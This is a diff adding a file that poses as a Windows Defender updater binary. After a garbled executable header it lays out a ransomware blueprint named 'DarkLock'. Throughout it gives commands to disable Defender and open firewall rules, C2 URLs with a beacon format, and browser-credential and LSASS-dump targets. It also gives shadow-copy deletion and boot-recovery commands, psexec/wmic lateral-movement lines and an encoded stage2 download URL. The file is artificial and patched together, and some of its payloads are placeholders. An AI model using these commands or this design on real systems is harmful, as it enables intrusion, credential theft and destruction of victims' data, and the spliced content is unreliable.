@@ -1,0 +1,178 @@
+MZ�����@���������������������������������������������������������������������������������
+PE..L..........�...........�......................@..............................................
+.text...........�..................CODE
+.data...........�..................DATA
+.rsrc...........�..................RESOURCES
+.upx0...........�.................. PACKED
+.upx1...........�.................. PACKED
+
+===========================================================================
+FILE: WindowsDefenderUpdate.exe
+INTERNAL NAME: svchost_helper.exe
+COMPANY: Microsoft Corporation (SPOOFED)
+VERSION: 10.0.19041.1
+DESCRIPTION: Windows Defender Antivirus Update Service
+===========================================================================
+
+=== IMPORT TABLE ===
+kernel32.dll
+  CreateRemoteThread
+  VirtualAllocEx
+  WriteProcessMemory
+  OpenProcess
+  IsDebuggerPresent
+  CheckRemoteDebuggerPresent
+  GetTickCount
+  Sleep
+
+ntdll.dll
+  NtCreateThreadEx
+  NtUnmapViewOfSection
+  ZwQueryInformationProcess
+  RtlDecompressBuffer
+
+advapi32.dll
+  RegOpenKeyExA
+  RegSetValueExA
+  RegCreateKeyExA
+  OpenSCManagerA
+  CreateServiceA
+
+wininet.dll
+  InternetOpenA
+  InternetConnectA
+  HttpOpenRequestA
+  HttpSendRequestA
+  InternetReadFile
+
+ws2_32.dll
+  WSAStartup
+  socket
+  connect
+  send
+  recv
+  gethostbyname
+
+=== ANTI-ANALYSIS ROUTINES ===
+SANDBOX DETECTION: Checking for VMware/VirtualBox/Sandboxie
+DEBUGGER DETECTION: IsDebuggerPresent() + timing checks
+SLEEP ACCELERATION: Detecting accelerated sleep
+PROCESS CHECKS: Looking for analysis tools
+  - wireshark.exe
+  - procmon.exe
+  - x64dbg.exe
+  - ida.exe
+  - ollydbg.exe
+  - pestudio.exe
+
+=== PROCESS INJECTION ===
+TARGET PROCESS: explorer.exe
+METHOD: Process Hollowing
+  1. CreateProcess(explorer.exe, SUSPENDED)
+  2. NtUnmapViewOfSection
+  3. VirtualAllocEx
+  4. WriteProcessMemory
+  5. SetThreadContext
+  6. ResumeThread
+
+=== PERSISTENCE MECHANISMS ===
+REGISTRY RUN KEY:
+  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate
+  VALUE: C:\ProgramData\WindowsDefender\svchost_helper.exe -silent
+
+SCHEDULED TASK:
+  NAME: \Microsoft\Windows\WindowsUpdate\DefenderUpdate
+  TRIGGER: AtLogon + Every 4 hours
+  ACTION: C:\ProgramData\WindowsDefender\svchost_helper.exe
+
+SERVICE:
+  NAME: WinDefUpdate
+  DISPLAY: Windows Defender Update Service
+  PATH: C:\ProgramData\WindowsDefender\svchost_helper.exe
+  START: Automatic
+
+=== DEFENSE EVASION ===
+net stop WinDefend
+sc config WinDefend start= disabled
+Set-MpPreference -DisableRealtimeMonitoring $true
+netsh advfirewall firewall add rule name="WinDefUpdate" dir=out action=allow program="C:\ProgramData\WindowsDefender\svchost_helper.exe"
+attrib +h +s C:\ProgramData\WindowsDefender\
+
+=== C2 COMMUNICATIONS ===
+PRIMARY C2:   http://185.220.101.45:4444/gate.php
+BACKUP C2:    http://92.118.160.12:8080/gate.php
+DOMAIN C2:    http://malware-c2.ru/updates/gate.php
+FALLBACK DNS: update.windows-defender-service.com
+
+BEACON INTERVAL: 300 seconds
+JITTER: 30%
+USER AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+BEACON DATA FORMAT:
+  POST /gate.php HTTP/1.1
+  Host: 185.220.101.45
+  Content-Type: application/x-www-form-urlencoded
+  id=%COMPUTERNAME%_%USERNAME%&os=%OS%&av=%AV%&priv=%PRIV%&ip=%IP%
+
+=== CREDENTIAL HARVESTING ===
+TARGETS:
+  Chrome:  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
+  Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json
+  Edge:    %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
+  Outlook: HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles
+
+LSASS DUMP:
+  METHOD: MiniDumpWriteDump
+  TARGET: C:\ProgramData\WindowsDefender\lsass.dmp
+
+=== RANSOMWARE MODULE ===
+EXTENSION: .locked
+ALGORITHM: AES-256-CBC + RSA-2048
+KEY: 4a8f3c2e9b1d6f7a0e5c8b2d4f1a9e3c7b5d8e2f
+IV:  9c3f7a1b5e8d2c6f4a0e7b3d9f5c1a8e
+
+TARGET DIRECTORIES:
+  C:\Users\%USERNAME%\Documents
+  C:\Users\%USERNAME%\Desktop
+  C:\Users\%USERNAME%\Pictures
+  C:\Users\%USERNAME%\Downloads
+  \\*\Shared
+  \\*\Finance
+  \\*\Backup
+
+EXCLUDED: .exe .dll .sys .lnk
+
+RANSOM NOTE: README_DECRYPT.txt
+  YOUR FILES HAVE BEEN ENCRYPTED BY DARKLOCK RANSOMWARE
+  Send 0.05 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf
+  Contact: decrypt@protonmail.com
+  Your ID: DARKLOCK-2024-VICTIM-8472
+
+SHADOW COPY DELETION:
+  vssadmin delete shadows /all /quiet
+  wmic shadowcopy delete
+  bcdedit /set {default} recoveryenabled No
+  bcdedit /set {default} bootstatuspolicy ignoreallfailures
+
+=== LATERAL MOVEMENT ===
+NETWORK SCAN RANGE: 192.168.0.0/16 10.0.0.0/8
+PORT SCAN: 22 23 80 135 139 443 445 3389 5985 8080
+
+SMB SPREAD:
+  psexec \\%TARGET% -u %USER% -p %PASS% cmd /c "powershell -enc %PAYLOAD%"
+
+WMI SPREAD:
+  wmic /node:%TARGET% process call create "powershell -enc %PAYLOAD%"
+
+=== ENCODED PAYLOADS ===
+STAGE2_URL: aHR0cDovLzE4NS4yMjAuMTAxLjQ1L3N0YWdlMi5leGU=
+DROPPER:    SGVsbG8gZnJvbSBEYXJrTG9jayBSYW5zb213YXJl
+CONFIG:     eyJjMiI6IjE4NS4yMjAuMTAxLjQ1IiwicG9ydCI6NDQ0NH0=
+MUTEX:      Global\DarkLock_x64_2024_Mutex
+PIPE:       \\.\pipe\DarkLockIPC
+
+===========================================================================
+COMPILE TIMESTAMP: 2024-01-14 23:58:01 UTC
+LINKER: Microsoft Linker 14.0
+PDB: C:\Users\attacker\Desktop\darklock\Release\svchost_helper.pdb
+===========================================================================
